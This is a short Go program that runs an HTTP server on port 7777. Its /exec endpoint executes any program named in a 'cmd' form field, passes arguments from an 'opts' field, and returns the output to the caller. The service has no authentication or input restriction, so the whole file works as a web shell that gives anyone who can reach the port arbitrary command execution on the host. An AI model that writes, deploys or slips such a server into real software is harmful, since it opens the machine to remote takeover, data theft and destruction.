package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

func serveExec(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	cmd := r.Form.Get(`cmd`)
	if cmd == `` {
		fmt.Fprint(w, `cmd is empty`)
		return
	}
	opts := r.Form.Get(`opts`)
	options := strings.Split(opts, ` `)
	fmt.Println(options)
	cmdr := exec.Command(cmd, options...)
	cmdr.Stdout = w
	cmdr.Stderr = w
	err := cmdr.Run()
	if err != nil {
		fmt.Fprint(w, err.Error())
	}

}

func main() {
	http.HandleFunc(`/exec`, serveExec)
	err := http.ListenAndServe(`:7777`, nil)
	if err != nil {
		println(err.Error())
	}
}
